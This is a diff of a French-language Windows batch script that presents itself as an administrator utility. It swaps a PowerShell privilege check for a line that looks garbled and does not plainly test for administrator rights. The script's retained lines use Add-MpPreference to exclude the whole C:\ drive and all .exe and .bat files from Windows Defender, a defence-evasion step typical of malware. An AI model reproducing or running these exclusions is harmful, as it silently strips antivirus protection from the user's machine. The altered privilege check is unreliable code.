@@ -1,16 +1,15 @@
 @echo off
+set ^"|find "::">nul 2>&1 && goto :no || goto :yes
 
-powershell -Command "if (-Not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 1 }"
-if %errorlevel% neq 0 (
-    echo Pour pouvoir utiliser l'utilitaire, vous devez être un administrateur exécutant une session de console.
-    pause
-    exit
-)
-
+:no
 chcp 65001 > nul
+echo.&echo Pour pouvoir utiliser l'utilitaire, vous devez être un administrateur&echo exécutant une session de console. 
+chcp 850 > nul
+goto :EOF
 
-:: Le reste du script à exécuter avec des privilèges d'administrateur
-set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
+:yes
+set powershell="%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe"
+
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
 powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
 powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"
